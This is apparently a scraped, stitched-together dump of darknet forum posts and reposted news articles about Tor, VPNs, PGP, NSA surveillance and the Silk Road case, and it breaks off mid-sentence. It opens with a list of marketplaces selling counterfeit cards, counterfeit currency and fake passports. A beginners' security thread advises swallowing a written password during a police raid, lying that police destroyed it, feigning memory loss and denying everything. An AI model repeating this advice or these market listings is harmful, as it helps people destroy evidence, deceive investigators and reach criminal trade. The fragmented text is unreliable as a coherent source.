âprinted to look just like real VISA and Mastercardsâ and â[g]uarenteed to have at least $2500 left on [the] credit card limit,â according to the complaint. The other sites in this category are:    Cloud Nine    Fake Real Plastic    Hydra    Pandora    Pay Pal Center    Real Cards Team    The Green Machine    Zero Squad.Next up were sites with counterfeit currency. On âSuper Notes Counter,â a person could get $1,000 worth of counterfeit currency for only $420, according to the complaint. Other sites included    Alpaca, Blue Sky    Cloud Nine    Fast Cash!    Hydra     Pablo Escobar Drugstore    Solâs Unified USD Counterfeitâs    Super Note Counter    The Hidden Market    Zero SquadFinally, the complaint lists the sites offering fake identity documents, including passports. These sites are:    Alpaca    Black Market    Fake ID    Pablo Escobar Drugstore    Pandora, Silk Road 2.0    The Hidden Market."

Also tell the public that the nsa is having diffculty with tor, so you keep using it and they can gather intel. Tor was developed by the US navy. If that doesn't throw up a big red flag, i don't know what will.  Open source is the way to go so you can be peer reviewed and not trust xyz do do the right thing. Just look at the Enigma code and the fact that facilities like Cern exist, so is it not a long shot a (super) power has vast amounts of computer power available to them.  If you encrypt with xyz I'm sure the NSA, KGB and whatever chinas intel agency/dept is can decrypt it quite easily. I really doubt its beyond them technologically.

AirVPN allows connection to their VPN by SOCKS proxy 127.0.0.1 port 9150 from the OpenVPN GUI or AirVPN client. Connecting by Tor to AirVPN keeps your true IP out of any AirVPN logs.  In order to use AirVPN over Tor you will have to add a line to your <Path to Tor>\Tor Browser\Data\Tor\torrc-defaults file:  #SocksPort 9150 SocksPort 127.0.0.1:9150 PreferSOCKSNoAuth  Start Tor Browser Bundle first, then AirVPN. When you use AirVPN over Tor and check your IP in your Tor browser you will see the IP of the Tor exit node. If you open a different (non Tor) web browser checking IP will show the IP of the AirVPN server you are using. The AirVPN control panel will also confirm you are connecting to AirVPN from the Tor exit node IP.   When you are using the Tor browser should the VPN connection drop your true IP will still be protected as you will only be known by the IP of the Tor exit node. This is an advantage of using AirVPN over Tor. You can register over Tor and they accept bitcoin for payment.  When using AirVPN over Tor for applications other than browsing using the Tor Browser Bundle remember to setup your firewall to block all internet traffic should your VPN disconnect.",""

"The Hub Forums","Jolly Roger","52.80","2014-03-13T06:11:29","Jolly Roger's Security Thread for Beginners","Start Here/For Beginners","  Here are some things to consider.    Read those pages directly as they have links to other articles on them as well.  Here is another little trick I know of. Never keep a password you can remember. You cannot give up a password you do not know. Perhaps you have a little piece of paper with your password on it that you swallow the second the cops come in. A long password that you could never remember.   Another thing you can say is, I wrote down my password on a piece of paper but the police must have destroyed the piece of paper when they raided my home. Check out the below quote from an article.   And in the case of whether or not you can be forced to give up a password is a matter of debate that has gone back and forth in court cases to date.   And what about the charges for failing to do so?   And in the US, since most people busted will be extradited there anyways, treats contempt in the following way.   Furthermore.   In regards to two cases in which defendants were not forced to give up their passwords   The analysis of why they were not forced to give them up is below.   But when law enforcment was able to provide proof of existing evidence on an encrypted drive, courts were much more likely to demand decryption, such as in the following cases.   And the analysis of the cases below.   1) It may be possible, to identify you as a Tails user, but it would take a lot of analysis to do so, and Tails is getting better at blending in with every update.   2) Think about what you could possibly be charged with, and think about whether or not it is more serious than a contempt charge. The longest sentence to date for contempt was 14 years, and this is almost unheard of. You are not likely to get this kind of charge against you, but if you do, would it be better than life in prison for whatever else you might be charged with?  Remember Sabu to LulzSec hacker? being charged with 112 years in prison for hacking? I think he would trade 14 years in prison for contempt over 112 years any day. I know I would.  3) Without the knowledge of incriminating evidence existing on your drives, you are less likely to be forced to decrypt your drives, and this even applies in child pornography cases as demonstrated above.   4) Maintain your right to remain silent, never keep anything on your computers that you do not have to.   5) Do not have a password you can remember. Or if you do, tell them you had it written down but it was misplaced or possibly damaged during the raid and you are unable to recall the password. Perhaps you are too traumatized from the even of having your face shoved into the floor to remember what happened during those 2 minutes?  Anyways, this is a lot of data to go through, so I will leave it at that and we can go from there. You just need to always follow best practices. Turn off your computer when you are not using it, encrypt everything, never tell anybody your passwords, never leave any evidence of the contents of your drives lying around (like notes or diary entries), and never admit having anything on your drives to anyone online, even under your pseudonym as that can be used against you in court.  Deny deny deny deny deny.  Hope this helps.","Hi JR,For some reason I have seen a lot of information and discussion about privacy and anonymity but nothing at all about deniability, which to be honest concerns me that some people may think that because the NSA can't crack their password, everything is safe but people easily overestimate their ability to stand up to sanctions imposed by a court should the shit hit the fan...I was wondering about the deniability problems with using Tails (or any of the security measures really). You have to assume that if you get arrested and it goes to court, you will be compelled to give any of your passwords that they want. It's all well and good thinking that you won't give it to them, but when they sentence you to a $1000 a day or simply jail until you tell them you will probably tell them your passwords...With that in mind, is there any deniable way to use Tails (or at least deniable in some respects)? I used to run everything off a hidden volume in a Truecrypt memorystick (which is supposed to be impossible to prove exists), is there an equivalent with LUKS?Also, can your ISP or FBI differentiate between Tor and Tails through your internet usage?Thanks for your time;Tails makes it clear that you are using Tor and probably TailsYour Internet Service Provider (ISP) or your local network administrator can see that you're connecting to a Tor relay, and not a normal web server for example. Using Tor bridges in certain conditions can help you hide the fact that you are using Tor.The destination server that you are contacting through Tor can know whether your communication comes out from a Tor exit node by consulting the publicly available list of exit nodes that might contact it. For example using the Tor Bulk Exit List tool of the Tor Project.So using Tails doesn't make you look like any random Internet user. The anonymity provided by Tor and Tails works by trying to make all of their users look the same so it's not possible to identify who is who amongst them.https://tails.boum.org/doc/about/warning/index.en.html#index2h1;In this context, the term fingerprint refers to what is specific to Tails in the way it behaves on Internet. This can be used to determine whether a particular user is using Tails or not.As explained on our warning page, when using Tails it is possible to know that you are using Tor. But Tails tries to make it as difficult as possible to distinguish Tails users from other Tor users, especially Tor Browser Bundle (TBB) users. If it is possible to determine whether your are a Tails users or a TBB user, this provides more information about you and in consequence reduces your anonymity.This section explains some issues regarding the fingerprint of Tails and how this could be used to identify you as a Tails user.For the websites that you are visitingThe websites that you are visiting can retrieve a lot of information about your browser. That information can include its name and version, window size, list of available extensions, timezone, available fonts, etc.To make it difficult to distinguish Tails users from TBB users, the Tor browser tries to provide the same information as the TBB in order to have similar fingerprints.See the fingerprint section of know issues page for a list of known differences between the fingerprints of the Tor browser and the TBB.Apart from that, some of the extensions included in Tor browser are different than the ones included in the TBB. More sophisticated attacks can use those differences to distinguish Tails user from TBB users.For example, Tails includes Adblock Plus which removes advertisements. If an attacker can determine that you are not downloading the advertisements that are included in a webpage, that could help identify you as a Tails user.For the moment, you should consider that no special care is taken regarding the fingerprint of the Unsafe Browser.For your ISP or local network administrator    Tor bridges are most of the time a good way of hiding the fact that you are connecting to Tor to a local observer. If this is important for you, read our documentation about bridge mode.    A Tails system is almost exclusively generating Tor activity on the network. Usually TBB users also have network activity outside of Tor, either from another web browser or other applications. So the proportion of Tor activity could be used to determine whether a user is using Tails or the TBB. If you are sharing your Internet connection with other users that are not using Tails it is probably harder for your ISP to determine whether a single user is generating only Tor traffic and so maybe using Tails.    Tails do not use the entry guards mechanism of Tor. With the entry guard mechanism, a Tor user always uses the same few relays as first hops. As Tails does not store any Tor information between separate working sessions, it does not store the entry guards information either. This behaviour could be used to distinguish Tails users from TBB users across several working sessions.    When starting, Tails synchronizes the system clock to make sure it is accurate. While doing this, if the time is set too much in the past or in the future, Tor is shut down and started again. This behavior could be used to distinguish Tails from TBB users, especially this happens every time Tails starts.https://tails.boum.org/doc/about/fingerprint/index.en.html;Dubois said that, in addition, his client may not be able to decrypt the laptop for any number of reasons. ""If that's the case, then we'll report that fact to the court, and the law is fairly clear that people cannot be punished for failure to do things they are unable to do,"" he said. http://news.cnet.com/8301-31921_3-57364330-281/judge-americans-can-be-forced-to-decrypt-their-laptops/;Many in the legal arena say the issue is a tricky -- and largely unsettled one. A small number of courts have permitted it, but only when prosecutors can point to specifically what files they need and where they are located. In the motion filed earlier this week, Assistant County Prosecutor Matthew Meyer stated the law is not clear. http://www.cleveland.com/court-justice/index.ssf/2014/03/bedford_judge_case_highlights.html;disobeying a judge's order to hand over a password could result in contempt of court charges or being jailed.http://www.cleveland.com/court-justice/index.ssf/2014/03/bedford_judge_case_highlights.html;If a person is to be punished criminally, then the contempt must be proven beyond a reasonable doubt, but once the charge is proven, then punishment (such as a fine or, in more serious cases, imprisonment) is imposed unconditionally.A court cannot maintain an order of contempt where the imposed party does not have the ability to comply with the underlying order. This claim when made by the imposed party is known as the ""impossibility defense"".https://en.wikipedia.org/wiki/Contempt_of_court#United_States;âthe government must prove the existence and location of the subpoenaed documents and possess independent evidence, other than compliance with the court order, for authenticating themâ [1, p. 581]. In other words, law enforcement cannot simply go on a fishing expedition, hoping to turn up data that will be evidentiary [8]. They must be able to demonstrate the existence and likely location of specific documents. http://www.asis.org/Bulletin/Dec-13/DecJan14_Oltmann.html;United States v. Kirschner (2010): Kirschner was indicted for child pornography charges, and the government subpoenaed his encryption key to gain further evidence from his encrypted drive. In this case, the judge determined that requiring a defendant to supply his password would violate his right against self-incrimination.United States v. Doe (2012): Doe was charged with child pornography. He refused to supply his decryption key and was found in contempt of court, then jailed. A judge then ruled that supplying his decryption key would be tantamount to self-incrimination, so Doe did not have to supply it. http://www.asis.org/Bulletin/Dec-13/DecJan14_Oltmann.html;In contrast, law enforcement in the Kirschner and Doe cases did not have prior evidence that illegal content was on their computers. In these cases, officers had suspicion of wrongdoing and were relying on the revelation of decryption keys to investigate and uncover evidence. The court in Kirschner determined that sharing the key âwould be testimonial because it would demonstrate knowledge of the password and access to the underlying computer files â¦providing the password would reveal the contents of an arresteeâs mind by recalling the passwordâ [5, pp. 1171-1172], [6]. Simply put, because the password was not written down (or already known to law enforcement) in Kirschner and Doe, and it existed only in their minds, compelling a defendant to reveal it would be self-incriminating testimony.If law enforcement can describe the existence and location of evidence, they have a stronger case for requiring access; however, if they cannot demonstrate prior knowledge of the likely data, separate from a compelled revelation from a defendant, then law enforcement has a weaker position.http://www.asis.org/Bulletin/Dec-13/DecJan14_Oltmann.html;In re Boucher (2009): Boucher entered the United States from Canada. A border agent examined Boucherâs computer and found child pornography after Boucher supplied the password. The agent then shut down the computer and arrested Boucher. Shutting down the computer triggered the encryption again, and prosecutors could no longer see or find the illegal images. Boucher was ordered by the courts to supply the password, but he invoked his Fifth Amendment privilege. The courts subsequently ruled he had to supply a decrypted copy of the driveâs contents. Commonwealth v. Hurst (2011): Hurst was charged with offenses related to inappropriate sexual relations with a minor. Police suspected incriminating evidence was on Hurstâs cellphone, but he refused to supply the password. Before this case reached the court system, Hurstâs wife supplied the password, and Hurst himself pled guilty. United States v. Fricosu (2012): Fricosu was indicted for mortgage and real estate fraud. She refused to surrender the password (at one point saying she forgot the password) to encrypted files that, the government believed, would incriminate her. The court ordered her to supply a decrypted version of the hard drive, rather than her password. Subsequently, a co-defendant supplied the needed passwords. ;Law enforcement saw evidence of criminal wrongdoing in the Pearson, Boucher, Hurst and Fricosu cases. Both Pearson and Boucher voluntarily agreed to let law enforcement search their computers; during those searches, the officers saw evidence. It was only after the initial search that the question of encryption became relevant. In these cases, because the defendants had âpermitted investigators to see at least someâ of the evidence, this âsufficed to render the existence of all the illegal files a âforegone conclusionââ rather than testimonial evidence [8, p. 544]. Hurst had sent inappropriate messages to a minor, which were visible on the minorâs phone. While the police sought confirmation of the transmission by searching Hurstâs phone, they had sufficient evidence without that step. In the Fricosu case, police had recorded conversations between the defendant and her husband (a co-defendant) that revealed the existence and content of the sought-after documents. http://www.asis.org/Bulletin/Dec-13/DecJan14_Oltmann.html"

"The Hub Forums","firelight","2314.0","2014-03-24T22:04:29","Visiting non-onion sites","General Discussion/Security","This question can be answered many ways.  Is traffic analysis easier when visiting clearnet sites?  Yes. You rotate exit nodes every 10 minutes while a hidden service keeps its entry guards for a month or longer. Since your end of the connection is the same in both cases, you reach a certain probability of getting pwned by traffic analysis much faster when visiting clearnet sites than when visiting hidden servcies.  Is a clearnet site more likely to be malicious or try to deanonyize you than a hidden service?  Probably not. Clearnet sites may try to track you for targeted advertising, but Tor Browser does a good job of defending against linkability. It's worth noting that the only targeted deanonymization attack against Tor users that we know about came from a hidden service (Freedom Hosting).  Are there other factors that can threaten your anonymity?  Yes. The connection from the exit node to the clearnet site isn't encrypted unless you make it encrypted with SSL/TLS while circuits to hidden services are always encrypted end to end.  Also TCP streams to different clearnet sites may be multiplexed in the same circuit and leave the same exit node, which will know that you (or rather the same anonymous person) is visiting those sites, while circuits to hidden services are always separate. You can set an option in Tor's configuration file to enforce stream isolation although it's not recommended for web browsing.  A final factor affects other apps besides Tor Browser. If you misconfigure your proxy settings you may accidentally connect to a clearnet site over clearnet rather than over Tor, but misconfigured proxy settings will cause a connection to a hidden service to simply fail (perhaps with a DNS leak).

URL: http://arstechnica.com/security/2015/05/https-crippling-attack-threatens-tens-of-thousands-of-web-and-mail-servers/  ","HTTPS-crippling attack threatens tens of thousands of Web and mail serversDiffie-Hellman downgrade weakness allows attackers to intercept encrypted data.Tens of thousands of HTTPS-protected websites, mail servers, and other widely used Internet services are vulnerable to a new attack that lets eavesdroppers read and modify data passing through encrypted connections, a team of computer scientists has found.The vulnerability affects an estimated 8.4 percent of the top one million websites and a slightly bigger percentage of mail servers populating the IPv4 address space, the researchers said. The threat stems from a flaw in the transport layer security protocol that websites and mail servers use to establish encrypted connections with end users. The new attack, which its creators have dubbed Logjam, can be exploited against a subset of servers that support the widely used Diffie-Hellman key exchange, which allows two parties that have never met before to negotiate a secret key even though they're communicating over an unsecured, public channel.The weakness is the result of export restrictions the US government mandated in the 1990s on US developers who wanted their software to be used abroad. The regime was established by the Clinton administration so the FBI and other agencies could break the encryption used by foreign entities. Attackers with the ability to monitor the connection between an end user and a Diffie-Hellman-enabled server that supports the export cipher can inject a special payload into the traffic that downgrades encrypted connections to use extremely weak 512-bit key material. Using precomputed data prepared ahead of time, the attackers can then deduce the encryption key negotiated between the two parties.""Logjam shows us once again why it's a terrible idea to deliberately weaken cryptography, as the FBI and some in law enforcement are now calling for,"" J. Alex Halderman, one of the scientists behind the research, wrote in an e-mail to Ars. ""That's exactly what the US did in the 1990s with crypto export restrictions, and today that backdoor is wide open, threatening the security of a large part of the Web.""It wasn't supposed to be this wayIronically, Diffie-Hellman is supposed to provide an additional layer of protection because it allows the two connected parties to constantly refresh the cryptographic key securing Web or e-mail sessions. The so-called perfect forward secrecy that Diffie-Hellman makes possible significantly increases the work of eavesdropping because attackers must obtain the key anew each time it changes, as opposed to only once with other encryption schemes, such as those based on RSA keys. Logjam is significant because it shows that ephemeral Diffie-Hellmanâor DHEâcan be fatal to TLS when the export-grade ciphers are supported. Logjam is reminiscent of the FREAK attack that also allowed attackers to downgrade HTTPS connections to 512-bit cryptography.According to this informational site established by the researchers, only Internet Explorer has been updated to protect end users against Logjam attacks. The researchers said they have been working with developers of major browsers and that Chrome, Firefox, and Safari are also expected to implement a fix that rejects encrypted connections unless the key material contains a minimum of 1024 bits. Updates are expected to be available in the next day or two, and possibly much sooner. Information on vulnerable end-user e-mail programs wasn't available at the time this post was being prepared.According to the researchers, an estimated 8.4 percent of the top 1 million Web domains are vulnerable, and 3.4 percent of HTTPS-supported websites overall are susceptible. E-mail servers that support simple mail transfer protocol with StartTLS, secure POP3, and IMAP are estimated to be vulnerable in 14.8 percent, 8.9 percent, and 8.4 percent of the cases respectively.To exploit vulnerable connections, attackers must use the number field sieve algorithm to precompute data. Once they have completed that task, they can use it to perform man-in-the-middle attacks against vulnerable connections in real time. Using academic-level hardware, the researchers required just two weeks to generate data needed to attack the two most commonly called prime numbers 512-bit Diffie-Hellman uses to negotiate ephemeral keys. Those two data sets allow the attackers to compromise about 92 percent of sites supporting the export cipher. It wouldn't require much additional work to generate data needed to attack the remaining sites.Snowden revelations revisitedThe work required to precompute data needed to attack 768- and 1024-bit primes is orders of magnitude harder, but the researchers said the load is nonetheless within the means of state-sponsored eavesdroppers. In a research paper titled Imperfect Forward Secrecy: How Diffie-Hellman Fails in Practice, the researchers speculate the technique may be the means the National Security Agency reportedly uses to routinely break millions of encrypted connections. Documents leaked by former NSA subcontractor Edward Snowden revealed the mass crypto attacks but didn't say how they're carried out. Besides attacking HTTPS-protected Web and e-mail sessions, the researchers said, the same technique may be used to break SSH and VPN connections, too.""The technical details of our attack have also let us look at some of the leaked NSA documents in a new light, and give an explanation consistent with the documents and our experiments of how the NSA might be breaking certain crypto protocols on a wide scale,"" Nadia Heninger, a scientist at the University of Pennsylvania and an author of the paper, wrote in an e-mail.In the short term, the researchers recommend all server administrators disable support for the DHE_EXPORT ciphersuites that allow Diffie-Hellman connections to be downgraded. The researchers have provided a guide with step-by-step instructions for securely deploying Diffie-Hellman in TLS. And of course, they also strongly encourage all end users to install browser and e-mail client patches that enforce minimum restrictions on the primes used to negotiate ephemeral keys. Over the longer term, they say, developers should transition to so-called elliptic curve Diffie-Hellman key exchange, since the scheme is less vulnerable to precomputed attacks.Logjam continues a trend begun a few years ago of using catchy words or phrases to name vulnerabilities or the attacks that exploit them. Thankfully, this vulnerability disclosure wasn't accompanied by a logo, and the dedicated website offers a wealth of important information without any hype. Halderman told Ars the name is a pun on the ""discrete log"" mathematical operation used to break the weak keys. ""But the name is also an allusion to the fact that these '90s-era export ciphers are part of an immense amount of technical debt that's built up in our crypto protocols,"" he added in an e-mail. ""There's just too much dead wood that's accumulated over the years."""

I am surprised no one thought to check out other implementations of dh....  [warning:cloudflare]thehackernews.com/2013/09/NSA-can-crack-TOR-Encryptio-Snowden-files-.html    ","How many tor sites use HTTPS?; The spy agencies' activities have gone on for more than a decade. Now we have enough details about how the NSA eavesdrops on the internet, another explosive news has emerged yesterday from the Snowden files that NSA has the ability to decrypt most of anything that is on the internet.They have done this not through cracking encryption mathematically, but by secretly using influence and billions of dollars to insert backdoors designed to preserve their ability to eavesdrop. Like Us on Facebook:Also the majority of devices connected to the Tor anonymity network may be using encryption keys that can be broken by the National Security Agency, according to Rob Graham, CEO of penetration testing firm Errata Security.The ability to crack high-level encryption is something that has been a pretty significant legend in the infosec community. Graham arrived at that conclusion after analyzing nearly 23,000 Tor connections through an exit node that Graham controls and about 76 percent of the 22,920 connections he polled used some form of 1024-bit Diffie-Hellman key.Graham said that Tor still uses 1024 RSA/DH keys for much of its crypto particularly because most people are still using older versions of the software. The older 2.3 versions of Tor use keys the NSA can crack, but few have upgraded to the newer 2.4 version with better keys.The latest release of Tor, version 2.4, switches from the standard Diffie-Hellman key exchange to ECDHE, which are Elliptical-Curve Diffie-Hellman keys, which may greatly increase the privacy of the Tor network. Of course there's no guarantee that the NSA hasn't already found an easy way to crack ECDHE, but considering it's not currently as common as other encryption techniques, for now there's a greater chance that it's more secure.Unfortunately for the thousands of people who rely on Tor, many of the devices they use to connect to its servers could still be infiltrated by the NSA. To make matters worse, it came just a day after the report that 90 percent of Internet users have taken steps to avoid surveillance in some way.Bruce Schneier, security blogger made the following statement that Government and industry have betrayed the internet, and us. ""By subverting the internet at every level to make it a vast, multi-layered and robust surveillance platform, the NSA has undermined a fundamental social contract.""He advised to Hide yourself in the network, Encrypt your communications, Assume that while your computer can be compromised, it would take work and risk on the part of the NSA so it probably isnât, Be suspicious of commercial encryption software, especially from large vendors. Try to use public-domain encryption that has to be compatible with other implementations.It has been made public that the Department of Defense provided Tor with $876,099 in 2012, a sum large enough to make up 40 percent of the projectâs $2 million budget. Torâs executive director Andrew Lewman has said that the intelligence agency has not requested a backdoor into the system."

The easiest, and I really mean it, PGP program to use, hands down, for Windows and Linux users is gpg4usb which you can download at this clearnet link: http://www.gpg4usb.org/  gpg4usb is a standalone, compact cut and paste PGP utility which you can store on your desktop or on a USB drive. It allows you to easily generate your first 4096 bit RSA key pair and get started within an hour. The get started documentation at the gpg4usb home page should be all you need, however if you need extra help there is a great guide to gpg4usb at this clearnet link: https://securityinabox.org/en/gpg4usb_portable  gpg4usb works great if all you need is a simple and secure way to encrypt PMs or email. If you want to take it up a notch and use PGP automatically with your Thunderbird email client you need to check out this clearnet guide, follow it to the letter and you will be good to go: https://securityinabox.org/en/thunderbird_portable  When Thunderbird is set up according to this guide PGP email is transformed and becomes easy, convenient and as good as it gets. Try it for yourself and I betcha you will become a convert.   For OS X users needing a portable standalone PGP tool the best alternative to gpg4usb is Portable PGP which you can download at this clearnet link - http://sourceforge.net/projects/ppgp/",""

You can load up a thumb drive with portable PGP, Thunderbird, Enigmail, TorBirdy, Tor, I2P, TBB and have everything you need all in one location.   Use TrueCrypt Portable to encrypt most of the drive and keep a section unencrypted so you can run Truecrypt off it.   I know this is all possible for Windows.

ROM-only self-hardwired machines are equally susceptible to ""someone sneaking off with it and tampering."" Even if they weren't, you forgot to include that you'd need to write ALL of the software for the machine, unless you were planning to use pre-established code in the ROM, and good luck with that the next time a 'shellshock' event happens. This situation is untenable from all directions, unless your name is Alan Turing. But let's be productive, shall we? False dichotomies are quite tedious.  2. There are many, many ways to be ""safe"" as ""safe"" is not a binary value. Decreasing probabilities is all that you can ever do, in this life. One can never make a ""safe"" car or a ""safe"" safe. Moving forward with the understanding that we may only ever decrease probabilities of de-anonymization and decryption, we arrive at: how? FDE works for securing one's data unless a password or keyfile is intercepted. That is it. The question flashy asked was, if I may paraphrase, how may one secure the unencrypted section of a FDE'd system, probably out of worry of an evil maid attack. Now, we can spitball ideas for him, such as that very interesting write-blocking gizmo, or we can spread FUD. Let us all not devolve to that.

Source: http://www.infowars.com/greenwald-nsa-intercepts-computer-hardware-and-fits-it-with-surveillance-equipment/","Glenn Greenwald, the journalist who broke the Edward Snowden revelations, has come good on his promise that fresh information on the NSAâs mass spying would be forthcoming. Today he reveals that the US government agency routinely intercepts computer hardware such as routers, switches and servers, and fits it with cutting edge surveillance equipment, before sending it back on its way.In an article for The Guardian, Greenwald notes that the NSA tampers with the hardware, then repackages it with âfactory sealingâ before sending it off to unsuspecting companies who have no idea it has been intercepted.Greenwald notes that the practice constitutes âan extreme form of gross hypocrisy,â given that it has been warning companies around the world not to buy Chinese hardware because it may be set up with surveillance technology.The revelation again comes from documents leaked to Greenwald by former NSA employee Edward Snowden. Specifically, a June 2010 report from the head of the NSAâs Access and Target Development department states that US made hardware is âreceivedâ by the NSA before it is shipped overseas.Greenwald writes:    âThe agency then implants backdoor surveillance tools, repackages the devices with a factory seal, and sends them on. The NSA thus gains access to entire networks and all their users. The document gleefully observes that some âSIGINT tradecraft â¦ is very hands-on (literally!)ââ.âIn one recent case, after several months a beacon implanted through supply-chain interdiction called back to the NSA covert infrastructure. This call back provided us access to further exploit the device and survey the network.â the NSA document reads.âChinese routers and servers represent not only economic competition but also surveillance competition.â Greenwald writes.In a follow up interview with NPR, Greenwald stated that while intercepting equipment known to be on its way to terrorists may be acceptable to some, âa system has been built without our knowledge that has incredible dangers embedded within and very few controls.âGreenwald notes that the NSA essentially believes it has the right to monitor all communications on the planet. He cites an NSA plan to tap into conversations originating from airplanes, for no particular reason.âItâs just simply the fact that they do not think anybody should be able to communicate anywhere on the Earth without they being able to invade it,â Greenwald said.Greenwald added that he believes the issue today is more pressing than previous NSA revelations in 2005 because it concerns domination of the internet and global communications in general.With former NSA head Michael Hayden also making statements such as âWe kill people based on metadataâ, this sentiment will only be accepted more readily, both by critics of the spy agency and everyday Americans alike."

"The Hub Forums","Angel Eyes","6982.0","2015-02-06T04:08:12","Werner Koch who wrote and maintains the GnuPG core software","General Discussion/Security","He wrote GPG4Win, and the libraries at the core of GPGTools and pretty much every other PGP software tool out there.  Looks like he's getting some funding now, but lets give him as much as we can so he can keep doing this job for many more years.  ---- The man who built the free email encryption software used by whistleblower Edward Snowden, as well as hundreds of thousands of journalists, dissidents and security-minded people around the world, is running out of money to keep his project alive.  Werner Koch wrote the software, known as Gnu Privacy Guard, in 1997, and since then has been almost single-handedly keeping it alive with patches and updates from his home in Erkrath, Germany. Now 53, he is running out of money and patience with being underfunded.  ""I'm too idealistic,"" he told me in an interview at a hacker convention in Germany in December. ""In early 2013 I was really about to give it all up and take a straight job."" But then the Snowden news broke, and ""I realized this was not the time to cancel.""  Like many people who build security software, Koch believes that offering the underlying software code for free is the best way to demonstrate that there are no hidden backdoors in it giving access to spy agencies or others. However, this means that many important computer security tools are built and maintained by volunteers.   https://www.propublica.org/article/the-worlds-email-encryption-software-relies-on-one-guy-who-is-going-broke  Now, more than a year after Snowden's revelations, Koch is still struggling to raise enough money to pay himself and to fulfill his dream of hiring a full-time programmer. He says he's made about $25,000 per year since 2001 â a fraction of what he could earn in private industry. In December, he launched a fundraising campaign that has garnered about $43,000 to date â far short of his goal of $137,000 â which would allow him to pay himself a decent salary and hire a full-time developer.  The fact that so much of the Internet's security software is underfunded is becoming increasingly problematic. Last year, in the wake of the Heartbleed bug, I wrote that while the U.S. spends more than $50 billion per year on spying and intelligence, pennies go to Internet security. The bug revealed that an encryption program used by everybody from Amazon to Twitter was maintained by just four programmers, only one of whom called it his full-time job. A group of tech companies stepped in to fund it.  Koch's code powers most of the popular email encryption programs GPGTools, Enigmail, and GPG4Win. ""If there is one nightmare that we fear, then it's the fact that Werner Koch is no longer available,"" said Enigmail developer Nicolai Josuttis. ""It's a shame that he is alone and that he has such a bad financial situation.""  The programs are also underfunded. Enigmail is maintained by two developers in their spare time. Both have other full-time jobs. Enigmail's lead developer, Patrick Brunschwig, told me that Enigmail receives about $1,000 a year in donations â just enough to keep the website online.  GPGTools, which allows users to encrypt email from Apple Mail, announced in October that it would start charging users a small fee. The other popular program, GPG4Win, is run by Koch himself.  Email encryption first became available to the public in 1991, when Phil Zimmermann released a free program called Pretty Good Privacy, or PGP, on the Internet. Prior to that, powerful computer-enabled encryption was only available to the government and large companies that could pay licensing fees. The U.S. government subsequently investigated Zimmermann for violating arms trafficking laws because high-powered encryption was subject to export restrictions.  In 1997, Koch attended a talk by free software evangelist Richard Stallman, who was visiting Germany. Stallman urged the crowd to write their own version of PGP. ""We can't export it, but if you write it, we can import it,"" he said.  Inspired, Koch decided to try. ""I figured I can do it,"" he recalled. He had some time between consulting projects. Within a few months, he released an initial version of the software he called Gnu Privacy Guard, a play on PGP and an homage to Stallman's free Gnu operating system.  Koch's software was a hit even though it only ran on the Unix operating system. It was free, the underlying software code was open for developers to inspect and improve, and it wasn't subject to U.S. export restrictions. Like many people who build security software, Koch believes that offering the underlying code for free is the best way to demonstrate that there are no hidden backdoors giving access to spy agencies or others. (Willi Nothers for ProPublica)  Koch continued to work on GPG in between consulting projects until 1999, when the German government gave him a grant to make GPG compatible with the Microsoft Windows operating system. The money allowed him to hire a programmer to maintain the software while also building the Windows version, which became GPG4Win. This remains the primary free encryption program for Windows machines.  In 2005, Koch won another contract from the German government to support the development of another email encryption method. But in 2010, the funding ran out.  For almost two years, Koch continued to pay his programmer in the hope that he could find more funding. ""But nothing came,"" Koch recalled. So, in August 2012, he had to let the programmer go. By summer 2013, Koch was himself ready to quit.  But after the Snowden news broke, Koch decided to launch a fundraising campaign. He set up an appeal at a crowdsourcing website, made t-shirts and stickers to give to donors, and advertised it on his website. In the end, he earned just $21,000.  The campaign gave Koch, who has an 8-year-old daughter and a wife who isn't working, some breathing room. But when I asked him what he will do when the current batch of money runs out, he shrugged and said he prefers not to think about it. ""I'm very glad that there is money for the next three months,"" Koch said. ""Really I am better at programming than this business stuff.""",""

Ext4 and NTFS both have ""journaling"" capability, whereas FAT does not (unless you're talking about exFat?) and so that might determine where you should go.

The damn fool kept so much evidence on his laptop, that his defense attorney was hog-tied from the get-go. They can attempt an appeal to a higher court, but I do not expect that to succeed either.  Two weeks from today, Ross is going to appear again before the judge that just rejected his appeal, and she is going to sentence him to life in prison.   It doesn't matter  what his attorney comes up with, he is done for... toast. As a general rule, appeals courts are very loath to overturn the verdict of a jury, as the jury are not only the arbiter of facts, but they heard all the evidence presented, as did the judge. In order to overturn such a guilty verdict, the appeals court would have to find such an egregious violation of law or procedure (on the part of the judge or the prosecution) that it isn't funny. That is simply not going to happen.   I suspect that Ulbricht's family is going to bankrupt themselves fruitlessly trying to appeal this case and, despite all that, he will still die in prison.   Zaphod    Author: Andy Greenberg 2015-04-27 8:27 pm  Headline: Silk Road Judge Denies Retrial Despite Agentsâ Alleged Corruption  [image]  Caption: In this courtroom sketch, courtroom deputy Joseph Pecorino reads the jury's verdict against Ross William Ulbricht, Feb. 4, 2015. Elizabeth Williams/AP  Just two months after Ross Ulbricht was convicted of running the billion-dollar online black market for drugs known as the Silk Road, he was offered what looked like a slim new hope of a retrial: Charges that two of the agents involved in investigating the anonymous drug market had themselves engaged in massive corruption, including blackmailing Ulbricht and stealing hundreds of thousands of dollars of the siteâs bitcoins. But now the judge in the case has made it clear that neither those new corruption charges nor a pile of other complaints from Ulbrichtâs defense is going to win Silk Roadâs creator a second chance at freedom.  In a ruling filed Monday afternoon, judge Katherine Forrest denied a motion from Ulbrichtâs defense for a new trial, shooting down a series of arguments made by his defense team. Those arguments had included that the prosecution gave the defense insufficient time to review the evidence in the trial, that warrantless investigative attempts to identify the Silk Road server had violated Ulbrichtâs fourth amendment privacy rights, and that new corruption charges against a Drug Enforcement Administration agent and Secret Service agent required a new examination of whether the case had been tainted.  Forrest was utterly unconvinced. âThe evidence of Ulbrichtâs guilt was, in all respects, overwhelming. It went unrebutted,â she wrote in her ruling. âThis motion for a new trialâ¦does not address how any additional evidence, investigation, or time would have raised even a remote (let alone reasonable) probability that the outcome of the trial would be any different.â  Forrest wrote in her ruling that the defense hadnât proven that it had insufficient time to examine any of the prosecutionâs evidence or what significant argument it would have raised had it had the time. And she emphasized that any additional argument would have had to combat the overwhelming evidence of Ulbrichtâs guilt, which included the fact that he was arrested with his hands on the keyboard of a laptop full of his recorded chat logs and personal journal from his time running the Silk Roadâs massive drug operation. âThe Government presented overwhelming evidence of Ulbrichtâs guilt. Ulbricht was caught red-handedâlogged in and chatting [under his pseudonym the Dread Pirate Roberts] on a personal laptop, which Ulbricht unquestionably owned, filled with Silk Road files,â she writes. âIn the face of this mound of evidence, there is no faint 